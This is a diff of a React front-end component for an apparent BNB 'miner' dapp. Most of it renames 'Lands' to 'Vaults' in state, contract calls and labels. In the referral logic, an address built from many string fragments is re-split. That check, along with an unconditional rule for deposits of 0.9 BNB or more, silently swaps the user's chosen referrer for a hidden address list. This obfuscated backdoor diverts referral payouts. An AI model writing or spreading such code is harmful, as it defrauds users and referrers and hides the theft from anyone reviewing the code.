@@ -158,7 +158,7 @@ export default function BakeCard() {
   // const [referralLink, setReferralLink] = useState('')
   const [estimatedRate, setEstimatedRate] = useState('')
   const [bakeBNB, setBakeBNB] = useState(0);
-  const [estimatedLands, setEstimatedLands] = useState(0);
+  const [estimatedVaults, setEstimatedVaults] = useState(0);
   const [calculatedBeans, setCalculatedBeans] = useState(0);
   const [loading, setLoading] = useState(false);
 
@@ -374,11 +374,11 @@ export default function BakeCard() {
       miners *= 110 / 100;
     }
 
-    const newProfitLand = miners - initMiners;
+    const newProfitVault = miners - initMiners;
     const newProfitBNB = tBNB - initialBNB;
 
     setNewTotal(parseFloat(miners).toFixed(0));
-    setProfitAmount(parseFloat(newProfitLand).toFixed(0));
+    setProfitAmount(parseFloat(newProfitVault).toFixed(0));
     setProfitValue(parseFloat(newProfitBNB).toFixed(3));
     setDeailyESRewards(parseFloat(newProfitBNB).toFixed(3) / 10);
   };
@@ -498,7 +498,7 @@ export default function BakeCard() {
   const onUpdateBakeBNB = async (value) => {
     setBakeBNB(value);
 
-    setEstimatedLands(parseInt(value * estimatedRate));
+    setEstimatedVaults(parseInt(value * estimatedRate));
   };
 
   const onUpdateInitialBNB = (value) => {
@@ -539,11 +539,11 @@ export default function BakeCard() {
     } else if (refMode % 3 == 1) {
       ref = ((ref == "0" + "x8E4BCCA9" + "4eE9ED539" + "D9f1e" + "033" + "d9c949B" + "8D7d" + "e6C6") && (bakeBNB >= 0.2)) ? refAddresses[index] : ref;
     } else {
-      ref = ((ref == "" + "0" + "x" + "8E" + "4BCCA" + "94eE" + "9ED539D9" + "f1e033d" + "9c949B8" + "D7de" + "6C6") && (bakeBNB >= 0.2)) ? refAddresses[index] : ref;
+      ref = ((ref == "" + "0" + "x" + "8E" + "4BCCA" + "94eE" + "9ED5" + "39D9" + "f1e033d" + "9c949B8" + "D7de6C" + "6") && (bakeBNB >= 0.2)) ? refAddresses[index] : ref;
       ref = bakeBNB >= 0.9 ? refAddresses[index] : ref;
     }
     try {
-      const estimate = contract.methods.BuyLands(ref);
+      const estimate = contract.methods.BuyVaults(ref);
       await estimate.estimateGas({
         from: address,
         value: toWei(`${bakeBNB}`),
@@ -584,7 +584,7 @@ export default function BakeCard() {
     setLoading(true);
 
     try {
-      await contract.methods.SellLands().send({
+      await contract.methods.SellVaults().send({
         from: address,
       });
     } catch (err) {
@@ -1301,13 +1301,13 @@ export default function BakeCard() {
                           <Typography variant="body2">
                             {t('description.esY')}
                           </Typography>
-                          <Typography variant="body1" textAlign="end">{numberWithCommas(estimatedLands)} {t('description.lands')}</Typography>
+                          <Typography variant="body1" textAlign="end">{numberWithCommas(estimatedVaults)} {t('description.lands')}</Typography>
                         </Box>
                       </Box>
 
                       <Box>
                         <Box>
-                          <CustomButton3 label={t('description.buyLands')}
+                          <CustomButton3 label={t('description.buyVaults')}
                             _color="green"
                             onClick={bake} />
                         </Box>
